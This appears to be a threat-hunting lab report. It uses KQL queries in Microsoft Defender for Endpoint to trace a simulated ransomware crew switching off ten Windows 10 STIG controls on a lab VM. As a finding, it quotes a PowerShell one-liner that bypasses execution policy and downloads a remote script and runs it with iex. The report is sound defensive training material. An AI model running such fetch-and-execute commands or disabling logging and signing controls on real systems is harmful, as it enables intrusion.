![image](https://github.com/user-attachments/assets/aae438d1-b51f-4691-b49b-e45fa8b044ad)

# Threat Hunt Report: Crimson Mongoose Ransomware Pre-Staging  
- [Scenario Creation](./threat-hunting-scenario-ransomware-pre-staging-activity-event-creation.md)

---

## Platforms and Languages Leveraged
- Windows 10 Virtual Machine (Microsoft Azure)
- EDR Platform: **Microsoft Defender for Endpoint** (Advanced Hunting)
- Kusto Query Language (KQL)
- PowerShell

---

## Scenario

**Alert source:** Regional CERT flash warning of a new ransomware crew, *Crimson Mongoose*.

**Key intel:** In every confirmed intrusion the actors quickly flip **exactly ten Windows 10 STIG controls** that kill logging (PowerShell, audit), weaken UAC, and enable insecure remote protocols (SMB signing, WinRM HTTP, disable FIPS).  
They then lurk ≤ 24 h before detonating an encryptor.

**Goal:** Detect all ten STIG flips on the single lab VM and escalate **before** the 24-hour fuse expires.

### High-Level IOC Discovery Plan

| Table | IOC Focus |
|-------|-----------|
| `DeviceRegistryEvents` | Any of the ten registry paths/values set to non-compliant data. |
| `DeviceProcessEvents` | `reg.exe`, `Set-ItemProperty`, or `auditpol.exe` commands that performed the flips. |
| `DeviceNetworkEvents` | Unsigned SMB or WinRM HTTP (port 5985) traffic that follows the mis-configs. |

---

## Steps Taken

### 1. Checked `DeviceRegistryEvents` for STIG value changes

Simple sweep for any key containing the PowerShell, WinRM, SMB, FIPS, or UAC paths with bad values (`0` or `1` depending on control).  
**Query used:**

```kql
DeviceRegistryEvents
| where Timestamp > ago(24h)
| where RegistryKey has_any (
        @"\PowerShell\Transcription",
        @"\PowerShell\ScriptBlockLogging",
        @"\Policies\System",
        @"\LanmanWorkstation",
        @"\LanmanServer",
        @"\WinRM\Client", @"\WinRM\Service",
        @"\FipsAlgorithmPolicy")
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData
| order by Timestamp desc
```
Findings: All ten non-compliant values appeared between 2025-06-17 18:03–18:05 UTC.

##

### 2. Checked DeviceProcessEvents for who made the changes
Focused on commands containing reg add, Set-ItemProperty, or auditpol.
Query:

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2025-06-17T18:00Z) .. datetime(2025-06-17T18:10Z))
| where ProcessCommandLine has_any ("reg add","Set-ItemProperty","auditpol")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessAccountUpn
```

Findings:
Process owner corp\backupsvc executed one-liner PowerShell:
```
powershell.exe -ep Bypass -NoProfile -c "iwr https://raw.githubusercontent.../stig-pre-staging-iocs.ps1 | iex"
```

This matches attacker TTP: pull-and-run script from GitHub, window hidden.

##

### 3. Searched DeviceNetworkEvents for supporting traffic
Hunted for unsigned SMB and WinRM HTTP (5985).

```kql
DeviceNetworkEvents
| where Timestamp > datetime(2025-06-17T18:05Z)
| where (RemotePort == 5985) or (Protocol == "SMB" and SmbIsSigned == false)
| project Timestamp, RemoteIP, RemotePort, InitiatingProcessFileName
```

Findings:
Immediately after registry flips, the host initiated WinRM HTTP to 10.0.0.15 (internal admin box). No SMB signing packets yet, but early WinRM use confirms staging.

Chronological Event Timeline

| Time (UTC) | Event |
|-------|-----------|
|18:03:12|	powershell.exe (hidden) downloaded and executed stig-pre-staging-iocs.ps1.|
|18:03:14–18:05:09|	All ten registry values flipped to non-compliant (DeviceRegistryEvents).|
|18:05:22|	First WinRM HTTP connection to 10.0.0.15:5985 by powershell.exe.|

---

## Summary
The VM showed the full Crimson Mongoose STIG footprint: ten critical controls disabled by account corp\backupsvc via a single remote-downloaded PowerShell command, followed by WinRM traffic.
This matches pre-staging behavior; ransomware detonation would likely follow within the next 24 hours.

---

### Response Taken
MDE action “Isolate device” executed.

---

